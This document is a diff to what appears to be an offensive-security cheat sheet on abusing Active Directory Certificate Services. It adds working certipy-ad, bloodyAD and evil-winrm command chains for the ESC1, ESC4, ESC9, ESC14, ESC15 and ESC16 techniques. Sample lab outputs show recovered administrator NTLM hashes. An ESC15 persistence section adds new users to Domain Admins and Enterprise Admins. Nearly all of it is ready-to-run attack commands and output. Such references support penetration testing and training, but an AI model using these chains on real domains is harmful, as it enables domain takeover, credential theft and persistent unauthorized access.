@@ -1,7 +1,7 @@
 ---
 title: "ADCS"
 date: 2024-7-23
-tags: ["Kerberos", "Pass-The-Ticket", "Certify", "Credential Dumping", "LDAP", "Pass-The-Hash", "Ticket Granting Ticket", "Domain Controller", "Certificate Services", "Active Directory", "Windows", "ADCS", "Pass-The-Cert"]
+tags: ["Kerberos", "Pass-The-Ticket", "Certify", "Credential Dumping", "LDAP", "Pass-The-Hash", "Ticket Granting Ticket", "Domain Controller", "Certificate Services", "Active Directory", "Windows", "ADCS", "Pass-The-Cert", "Lookup SID"]
 ---
 
 ### Enum (From Linux)
@@ -116,7 +116,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 #### 2. Get NTLM Hash with pfx
 
 ```console
-sudo ntpdate -s <DC> && certipy-ad auth -pfx '<USER>.pfx'
+sudo ntpdate -s <DC_IP> && certipy-ad auth -pfx '<USER>.pfx' -domain <DOMAIN> -dc-ip <DC_IP>
 ```
 
 {{< /tabcontent >}}
@@ -145,18 +145,7 @@ openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provid
 
 ---
 
-### ESC1
-
-```console
-+----------------------------------------------------------+
-| Enabled                        : True                    |
-| Client Authentication          : True                    |
-| Enrollee Supplies Subject      : True                    |
-| Certificate Name Flag          : EnrolleeSuppliesSubject |
-| Requires Management Approval   : False                   |
-| Authorized Signatures Required : 0                       |
-+----------------------------------------------------------+
-```
+### ESC1: Enrollee-Supplied Subject for Client Authentication
 
 #### Abuse #1: Add Smartcard Logon
 
@@ -207,25 +196,52 @@ impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 {{< tab set5 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set5 tab1 >}}
 
-#### 1. Generate a Cert with Altname
+#### 1. Lookup SID
 
 ```console
 # Password
-certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn administrator@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096
+certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -user 'administrator' read
+```
+
+```console
+# NTLM
+certipy-ad account -u '<USER>@<DOMAIN>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -user 'administrator' read
+```
+
+```console {class="sample-code"}
+$ certipy-ad account -u 'cert_admin@example.com' -hashes 'f87---[SNIP]---773' -target 'dc01.example.com' -dc-ip '10.10.10.10' -user 'administrator' read
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'Administrator':
+    cn                                  : Administrator
+    distinguishedName                   : CN=Administrator,CN=Users,DC=example,DC=com
+    name                                : Administrator
+    objectSid                           : S-1-5-21-1---[SNIP]---7-500
+    sAMAccountName                      : Administrator
+    userAccountControl                  : 66048
+    whenCreated                         : 2024-11-16T00:01:41+00:00
+    whenChanged                         : 2025-07-14T11:03:29+00:00
+```
+
+#### 2. Request Certificate for the Target User
+
+```console
+# Password
+certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn administrator@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
 ```
 
 ```console
 # Kerberos
-certipy-ad req -u '<USER>' -p '<PASSWORD>' -k -target <TARGET> -upn administrator@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096
+certipy-ad req -u '<USER>' -p '<PASSWORD>' -k -target <TARGET> -upn administrator@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
 ```
 
-#### 2. Get NTLM Hash
+#### 3. Get NTLM Hash
 
 ```console
-sudo ntpdate -s <DC> && certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
+sudo ntpdate -s <DC_IP> && certipy-ad auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
 ```
 
-#### 3. Remote
+#### 4. Remote
 
 ```console
 evil-winrm -i <TARGET> -u administrator -H <HASH>
@@ -328,7 +344,7 @@ impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 
 ---
 
-### ESC4
+### ESC4: Template Hijacking
 
 {{< tab set7 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set7 tab1 >}}
@@ -336,19 +352,77 @@ impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 #### 1. Update Template
 
 ```console
-certipy-ad template -username '<USER>' -hashes '<HASH>' -template '<TEMPLATE>' -target <TARGET> -save-old
+# NTLM
+certipy-ad template -u '<USER>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>' -write-default-configuration -no-save
+```
+
+```console {class="sample-code"}
+$ certipy-ad template -u 'ca_svc@sequel.htb' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -template 'DunderMifflinAuthentication' -write-default-configuration -no-save
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
+[!] Use -debug to print a stacktrace
+[*] Updating certificate template 'DunderMifflinAuthentication'
+[*] Replacing:
+[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
+[*]     flags: 66104
+[*]     pKIDefaultKeySpec: 2
+[*]     pKIKeyUsage: b'\x86\x00'
+[*]     pKIMaxIssuingDepth: -1
+[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
+[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
+[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
+[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
+[*]     msPKI-Enrollment-Flag: 0
+[*]     msPKI-Private-Key-Flag: 16
+[*]     msPKI-Certificate-Name-Flag: 1
+[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
+Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
+[*] Successfully updated 'DunderMifflinAuthentication'
 ```
 
 #### 2. Request a Cert Based on the ESC4 Template
 
 ```console
+# NTLM
 certipy-ad req -username '<USER>' -hashes '<HASH>' -template '<TEMPLATE>' -target <TARGET> -ca <CA> -upn administrator@<DOMAIN>
+```
+
+```console {class="sample-code"}
+$ certipy-ad req -username 'ca_svc' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -template 'DunderMifflinAuthentication' -target DC01.sequel.htb -ca sequel-DC01-CA -upn administrator@sequel.htb
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: DC01.sequel.htb.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 6
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
 #### 3. Get NTLM Hash
 
 ```console
-certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
+certipy-ad auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.129.255.195
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@sequel.htb'
+[*] Using principal: 'administrator@sequel.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
 ```
 
 #### 4. Remote
@@ -361,7 +435,7 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 
 ---
 
-### ESC7
+### ESC7: Dangerous Permissions on CA
 
 ```console
 +---------------------+
@@ -410,7 +484,7 @@ certipy-ad req -ca <CA> -target <TARGET_DOMAIN> -retrieve <REQUEST_ID> -u '<USER
 #### 5. Get NTLM Hash
 
 ```console
-certipy-ad auth -pfx administrator.pfx -dc-ip <DC>
+certipy-ad auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
 ```
 
 #### 6. Remote
@@ -423,7 +497,7 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 
 ---
 
-### ESC8
+### ESC8: NTLM Relay to AD CS Web Enrollment
 
 {{< tab set9 tab1 >}}Linux{{< /tab >}}
 {{< tab set9 tab2 >}}Windows{{< /tab >}}
@@ -456,7 +530,7 @@ nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k -M coerce_plus -o LISTEN
 #### 5. Get NTLM Hash
 
 ```console
-certipy-ad auth -pfx <DC_HOSTNAME>.pfx -dc-ip <DC_IP>
+certipy-ad auth -pfx <DC_HOSTNAME>.pfx -domain <DOMAIN> -dc-ip <DC_IP>
 ```
 
 {{< /tabcontent >}}
@@ -508,7 +582,7 @@ certipy-ad auth -pfx cert.p12 -domain <DOMAIN> -dc-ip <DC_IP>
 
 ---
 
-### ESC9
+### ESC9: No Security Extension on Certificate Template
 
 {{< tab set10 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set10 tab1 >}}
@@ -525,6 +599,17 @@ certipy-ad account update -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -us
 certipy-ad account update -username '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn Administrator
 ```
 
+```console {class="sample-code"}
+$ certipy-ad account update -username 'management_svc@CERTIFIED.HTB' -hashes a091c1832bcdd4677c28b5a6a1295584 -user CA_OPERATOR -upn Administrator     
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
+[!] Use -debug to print a stacktrace
+[*] Updating user 'ca_operator':
+    userPrincipalName                   : Administrator
+[*] Successfully updated 'ca_operator'
+```
+
 #### 2. Request a Cert of Target User
 
 ```console
@@ -535,6 +620,22 @@ certipy-ad req -username '<TARGET_USER>@<DOMAIN>' -password '<PASSWORD>' -ca <CA
 ```console
 # NTLM
 certipy-ad req -username '<TARGET_USER>@<DOMAIN>' -hashes <HASH> -ca <CA> -template <VULN_TEMPLATE>
+```
+
+```console {class="sample-code"}
+$ certipy-ad req -username 'CA_OPERATOR@CERTIFIED.HTB' -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 6
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
 #### 3. Change Back Target User's userPrincipalName
@@ -549,16 +650,254 @@ certipy-ad account update -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -us
 certipy-ad account update -username '<USER>@<DOMAIN>' -hashes <HASH> -user <TARGET_USER> -upn '<TARGET_USER>@<DOMAIN>'
 ```
 
+```console {class="sample-code"}
+$ certipy-ad account update -username 'management_svc@CERTIFIED.HTB' -hashes a091c1832bcdd4677c28b5a6a1295584 -user CA_OPERATOR -upn 'CA_OPERATOR@CERTIFIED.HTB'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
+[!] Use -debug to print a stacktrace
+[*] Updating user 'ca_operator':
+    userPrincipalName                   : CA_OPERATOR@CERTIFIED.HTB
+[*] Successfully updated 'ca_operator'
+```
+
 #### 4. Get NTLM Hash
 
 ```console
-certipy-ad auth -pfx administrator.pfx -domain certified.htb
+certipy-ad auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator'
+[*] Using principal: 'administrator@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
 ```
 
 #### 5. Remote
 
 ```console
 evil-winrm -i <TARGET> -u administrator -H <HASH>
+```
+
+{{< /tabcontent >}}
+
+---
+
+### ESC14a: Weak Explicit Certificate Mapping (altSecurityIdentities)
+
+{{< tab set11 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set11 tab1 >}}
+
+#### 1. Create a Computer
+
+```console
+bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --host <DC> add computer evilcomputer '<NEW_PASSWORD>'
+```
+
+#### 2. Request a Cert of the Computer
+
+```console
+certipy-ad req -u 'evilcomputer$' -p '<NEW_PASSWORD>' -target <DC> -dc-ip <DC_IP> -ca <CA> -template Machine 
+```
+
+#### 3. Convert .pfx to .crt
+
+```console
+certipy-ad cert -pfx evilcomputer.pfx -nokey -out "evilcomputer.crt" 
+```
+
+#### 4. Inspect Serial Number and Issuer
+
+```console
+openssl x509 -in evilcomputer.crt -noout -text
+```
+
+#### 5. Convert to X509 Issuer SerialNumber Format
+
+```console
+python3 conv.py -serial '<SERIAL_NUMBER>' -issuer '<ISSUER>'
+```
+
+#### 6. Update Attribute (From Windows)
+
+```console
+$map = '<X509_ISSUER_SERIAL_NUMBER_FORMAT>'
+```
+
+```console
+Set-ADUser <TARGET_USER> -Replace @{altSecurityIdentities=$map}
+```
+
+#### 7. Get NTLM Hash
+
+```console
+certipy-ad auth -pfx evilcomputer.pfx -domain <DOMAIN> -dc-ip <DC_IP> -username '<TARGET_USER>'
+```
+
+<small>*Ref: [conv.py](https://mayfly277.github.io/posts/ADCS-part14/#esc14-a---write-access-on-altsecurityidentities)*</small>
+
+{{< /tabcontent >}}
+
+---
+
+### ESC14b: Weak Explicit Certificate Mapping (E-Mail)
+
+{{< tab set12 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set12 tab1 >}}
+
+#### 1. Modify Email of Target User
+
+```console
+# Password
+bloodyAD -u '<USER>' -p ':<HASH>' -d <DOMAIN> -f rc4 --host <DC> set object <USER> mail -v '<TARGET_USER>@<DOMAIN>'
+```
+
+#### 2. Request a Cert
+
+```console
+# NTLM
+certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<DC_IP>' -ca '<CA>' -template '<TEMPLATE>'
+```
+
+#### 3. Get NTLM Hash
+
+```console
+certipy-ad auth -pfx <USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP> -username <TARGET_USER>
+```
+
+{{< /tabcontent >}}
+
+---
+
+### ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")
+
+{{< tab set13 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set13 tab1 >}}
+
+#### 1. Lookup SID
+
+```console
+# Password
+certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -user 'administrator' read
+```
+
+```console
+# NTLM
+certipy-ad account -u '<USER>@<DOMAIN>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -user 'administrator' read
+```
+
+```console {class="sample-code"}
+$ certipy-ad account -u 'cert_admin@example.com' -hashes 'f87---[SNIP]---773' -target 'dc01.example.com' -dc-ip '10.10.10.10' -user 'administrator' read
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'Administrator':
+    cn                                  : Administrator
+    distinguishedName                   : CN=Administrator,CN=Users,DC=example,DC=com
+    name                                : Administrator
+    objectSid                           : S-1-5-21-1---[SNIP]---7-500
+    sAMAccountName                      : Administrator
+    userAccountControl                  : 66048
+    whenCreated                         : 2024-11-16T00:01:41+00:00
+    whenChanged                         : 2025-07-14T11:03:29+00:00
+```
+
+#### 2. Inject "Client Authentication" Application Policy and Target UPN
+
+```console
+# Password
+certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -ca '<CA>' -template 'WebServer' -upn 'administrator@<DOMAIN>' -sid '<SID>' -application-policies 'Client Authentication'
+```
+
+```console
+# NTLM
+certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -ca '<CA>' -template 'WebServer' -upn 'administrator@<DOMAIN>' -sid '<SID>' -application-policies 'Client Authentication'
+```
+
+#### 3. Spawn LDAP Shell
+
+```console
+certipy-ad auth -pfx 'administrator.pfx' -domain <DOMAIN> -dc-ip <DC_IP> -ldap-shell
+```
+
+#### 4. Persistence
+
+```console
+# Add New User
+add_user <NEW_USER>
+```
+
+```console
+# Add New User to Group
+add_user_to_group <NEW_USER> Administrators
+```
+
+```console
+# Add New User to Group
+add_user_to_group <NEW_USER> 'Domain Admins'
+```
+
+```console
+# Add New User to Group
+add_user_to_group <NEW_USER> 'Enterprise Admins'
+```
+
+```console
+# Add RDP
+add_user_to_group <NEW_USER> 'Remote Desktop Users'
+```
+
+```console
+# Add Winrm
+add_user_to_group <NEW_USER> 'Remote Management Users'
+```
+
+{{< /tabcontent >}}
+
+---
+
+### ESC16: Security Extension Disabled on CA (Globally)
+
+{{< tab set14 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set14 tab1 >}}
+
+#### 1. Read Initial UPN of the Victim Account \[Optional\]
+
+```console
+# Password
+certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -user '<TARGET_USER>' read
+```
+
+#### 2. Modify Target User's userPrincipalName (With GenericAll/GenericWrite)
+
+```console
+certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -upn 'administrator' -user '<TARGET_USER>' update
+```
+
+#### 3. Request a Cert as the Victim from Any Suitable Client Authentication Template
+
+```console
+certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -dc-ip <DC_IP> -target '<DC>' -ca '<CA>' -template 'User'
+```
+
+#### 4. Revert
+
+```console
+certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -upn '<TARGET_USER_UPN>' -user '<TARGET_USER>' update
+```
+
+#### 5. Get NTLM Hash
+
+```console
+certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain <DOMAIN> -dc-ip <DC_IP>
 ```
 
 {{< /tabcontent >}}
@@ -577,9 +916,9 @@ certipy-ad cert -pfx '<USER>.pfx' -nocert -out '<USER>.key'
 certipy-ad cert -pfx '<USER>.pfx' -nokey -out '<USER>.crt'
 ```
 
-{{< tab set11 tab1 >}}LDAP Shell{{< /tab >}}
-{{< tab set11 tab2 >}}RBCD{{< /tab >}}
-{{< tabcontent set11 tab1 >}}
+{{< tab set15 tab1 >}}LDAP Shell{{< /tab >}}
+{{< tab set15 tab2 >}}RBCD{{< /tab >}}
+{{< tabcontent set15 tab1 >}}
 
 #### 1. Get a LDAP Shell
 
@@ -602,7 +941,7 @@ evil-winrm -i <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>'
 <small>*Ref: [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)*</small>
 
 {{< /tabcontent >}}
-{{< tabcontent set10 tab2 >}}
+{{< tabcontent set15 tab2 >}}
 
 #### 1. RBCD Attack
 
@@ -613,7 +952,7 @@ python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to '<TARG
 #### 2. Request a Service Ticket
 
 ```console
-sudo ntpdate -s <DC> && python3 impacket-getST -spn 'cifs/<TARGET_DOMAIN>' -impersonate Administrator '<DOMAIN>/Evil_Computer$:<GENERATED_PASSWORD>'
+sudo ntpdate -s <DC_IP> && python3 impacket-getST -spn 'cifs/<TARGET_DOMAIN>' -impersonate Administrator '<DOMAIN>/Evil_Computer$:<GENERATED_PASSWORD>'
 ```
 
 #### 3. Secrets Dump
